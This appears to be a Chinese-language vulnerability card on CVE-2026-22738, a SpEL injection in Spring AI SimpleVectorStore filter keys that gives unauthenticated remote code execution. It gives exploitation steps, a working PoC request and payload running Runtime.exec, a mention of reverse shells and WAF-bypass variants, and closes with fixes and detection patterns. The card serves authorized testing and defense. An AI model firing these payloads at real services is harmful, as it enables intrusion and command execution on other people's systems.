---
id: web-java-expression-spel-spring-ai-simplevectorstore-filter-key-rce
title: 'Spring AI SimpleVectorStore 过滤键未转义 SpEL 注入：闭合 #metadata 字符串实现无认证 RCE（CVE-2026-22738）'
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-injection-filter-key-breakout
aliases:
- CVE-2026-22738
- SimpleVectorStore SpEL 注入
- Spring AI 向量库 RCE
- FilterExpressionBuilder 注入
- filterKey 注入
- 双引号包装器绕过
tags:
- spel
- expression-injection
- spring-ai
- simplevectorstore
- vector-store
- filter-expression
- rce
- java
- cve-2026-22738
cve:
- CVE-2026-22738
severity: critical
confidence: high
status: verified
affected_versions: spring-ai-core >=1.0.0 <1.0.5、>=1.1.0 <1.1.4（修复 1.0.5 / 1.1.4）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V132
  verified_at: '2026-11-06T05:49:27+08:00'
  notes: 已对照原文及29张图核对：CVE-2026-22738、受影响版本、FilterExpressionBuilder key 拼接、StandardEvaluationContext 懒加载与 payload 闭合链一致；仅原文 demo 环境验证，未在真实目标复现。
---

## 一句话结论

当 Spring AI 应用使用 `SimpleVectorStore` 并把用户输入作为过滤表达式的键（如 `FilterExpressionBuilder.eq(filterKey, filterValue)`）时，键会被直接拼进 SpEL 表达式并在 `StandardEvaluationContext` 下求值；攻击者用 `'] + T(java.lang.Runtime).getRuntime().exec(...) + #metadata['` 这样的键闭合 `#metadata['...']` 字符串并注入表达式，即可在未认证情况下执行任意系统命令（CVE-2026-22738）。

## 原理

- `SimpleVectorStore.doFilterPredicate()` 对每个文档创建 `StandardEvaluationContext`，把文档元数据注册为变量 `metadata`，再调用 `expressionParser.parseExpression(filterExpressionConverter.convertExpression(request.getFilterExpression())).getValue(context, Boolean.class)`。
- `StandardEvaluationContext` 在首次使用时会懒加载 `ReflectivePropertyAccessor`、`ReflectiveConstructorResolver`、`ReflectiveMethodResolver` 和 `StandardTypeLocator`，因此 SpEL 支持 `T(...)` 类型引用、`new` 构造对象、反射调用任意方法——这是从表达式注入走到命令执行的基础。
- 根因是表达式转换阶段直接把 `Filter.Expression` 的 key 拼进 `#metadata['<key>'] == '<value>'` 模板，未做任何转义。正常 key（如 `category`）生成 `#metadata['category'] == 'security'`；恶意 key 含 `']` 时可提前闭合字符串，再用 `+` 把任意 SpEL 子表达式接到顶层。
- 原文 payload 在 key 首尾额外加双引号（`"'] + ... + #metadata['"`），并解释为绕过转换器的单引号剥离/包装机制；生成的表达式形如 `#metadata['"'] + T(java.lang.Runtime).getRuntime().exec('calc') + #metadata['"'] == 'any'`，仍是合法 SpEL。
- 命令在表达式求值过程中就会执行：`#metadata['"']` 取到 null，`null + Process` 随后抛出 `EL1030E` 类型错误，但 `exec()` 已经完成，所以请求可能返回 500/异常，命令却已执行。
- 触发只要求应用把用户输入当作过滤键；CVE 评级为 `AV:N/AC:L/PR:N/UI:N`，CVSS 9.8。仅使用 `SimpleVectorStore` 且以用户输入作为过滤键的应用受影响。

## 触发条件

- 使用受影响版本 `org.springframework.ai:spring-ai-core`（>=1.0.0 <1.0.5、>=1.1.0 <1.1.4）。
- 应用使用 `SimpleVectorStore` 做向量检索，且检索入口可由外部访问。
- 用户可控值被用作 `Filter.Expression` 的 key（例如 `new FilterExpressionBuilder().eq(filterKey, filterValue).build()`，filterKey 来自请求参数），或整个过滤表达式可由用户控制。
- 未对 filter key 做白名单校验；表达式在默认/`StandardEvaluationContext` 下求值。

## 利用步骤

1. 找到接受过滤键/值的检索接口（如 `GET /search?filterKey=...&filterValue=...`），确认参数进入 `SimpleVectorStore.similaritySearch()` 的 `filterExpression`。
2. 构造恶意 key：以 `']` 闭合 `#metadata['...']`，接 `+ T(java.lang.Runtime).getRuntime().exec('<命令>') + #metadata['`，原文在外层再加一对双引号。
3. 对 key 做 URL 编码后提交；`filterValue` 任意（如 `any`），用于补全表达式尾部的比较。
4. 观察响应：命令已在 SpEL 求值时执行；随后 `null + Process` 触发 `EL1030E`，接口可能报错，这是正常现象。
5. 授权测试用 `id`、`whoami`、`touch /tmp/pwned` 等无害命令验证；需要回显时可用反弹 Shell、写文件或外带通道，再用独立通道取回结果。
6. 记录目标 Spring AI 版本、请求与时间，作为修复前回归样例。

## PoC

漏洞入口（示意）：

```java
@GetMapping("/search")
public String search(@RequestParam String filterKey, @RequestParam String filterValue) {
    Filter.Expression filterExpression = new FilterExpressionBuilder()
            .eq(filterKey, filterValue).build();
    SearchRequest searchRequest = SearchRequest.builder()
            .query("test")
            .filterExpression(filterExpression)
            .topK(1)
            .build();
    vectorStore.similaritySearch(searchRequest);
    return "Executed with filterKey: " + filterKey;
}
```

HTTP 请求（原文以 `calc` 验证，图中弹出计算器；授权测试建议换成 `id`）：

```http
GET /search?filterKey=%22%27%5D%20%2B%20T(java.lang.Runtime).getRuntime().exec(%27id%27)%20%2B%20%23metadata%5B%27%22&filterValue=any HTTP/1.1
Host: target:8080
```

key 解码后：

```text
"'] + T(java.lang.Runtime).getRuntime().exec('id') + #metadata['"
```

生成的 SpEL 表达式（原文）：

```text
#metadata['"'] + T(java.lang.Runtime).getRuntime().exec('id') + #metadata['"'] == 'any'
```

求值副作用：`exec('id')` 执行；随后 `null + Process` 抛 `EL1030E`，但命令已落地。

## 变体与关联

- 命令构造变体：`new java.lang.ProcessBuilder(new java.lang.String(new byte[]{...})).start()`、`T(java.lang.Character).toString(...).concat(...)` 逐字符拼接、反射 + 字符串拼接绕过 WAF 对 `Runtime`/`exec` 的匹配（见关联卡）。
- 键注入变体：不依赖双引号包装，只要能闭合 `#metadata['...']` 并让整体表达式合法，即可注入；是否成功取决于目标版本的转换器实现。
- 其他表达式入口：原文提出 `ChatClient`/`QuestionAnswerAdvisor` 的 `filterExpression(userInput)`、`PromptTemplate(userTemplate)`、`FunctionCallback` 的 name/description 作为可能的同类注入点，均标注“待确认”，未验证。
- 其他 VectorStore：原文列出 Chroma、Pinecone、Weaviate、Milvus、Redis、Postgres 等“是否使用 SpEL 待确认”，未验证，不能据此认定受影响。
- 关联卡片：[[web-java-expression-spel-injection-to-rce]]（用户输入直接进入 `SpelExpressionParser` 的通用 SpEL 注入与 T()/反射利用）、[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（关键字过滤绕过）、[[web-java-expression-spel-no-echo-exfil-streamutils]]（无回显外带）、[[web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce]]（Spring 生态另一处 SpEL 注入 CVE）。

## 检测与防御

- **升级**：`spring-ai-core` 升级到 1.0.5 或 1.1.4 及以上（CVE-2026-22738 修复版本）。
- **不要用户控制过滤键**：filter key 只允许来自服务端固定的字段名集合；对 key 做 `^[a-zA-Z0-9_]+$` 白名单校验，拒绝引号、括号、空格、`+`、`#`、`[`/`]` 等字符。参考修复示例：`ALLOWED_FILTER_KEYS` 不存在时直接返回 400。
- **表达式上下文**：组件侧应使用 `SimpleEvaluationContext` 或对表达式做语法白名单，不能对用户可控内容使用 `StandardEvaluationContext`。
- **WAF/网关**：对 filterKey 等参数先 URL 解码再检测 `T(`、`Runtime`、`getRuntime`、`ProcessBuilder`、`#metadata`、`'] +` 等组合特征；注意编码、大小写与反射变体。
- **检测**：检索接口出现包含引号/括号/`+`/`T(` 的 filterKey；日志中出现 `EL1030E` 或 SpEL 解析异常后紧跟命令执行迹象；同一来源批量探测过滤参数。
- **响应**：确认命令执行后按入侵处置，排查 System 进程与出站连接，轮换应用凭据，审计检索接口输入校验。
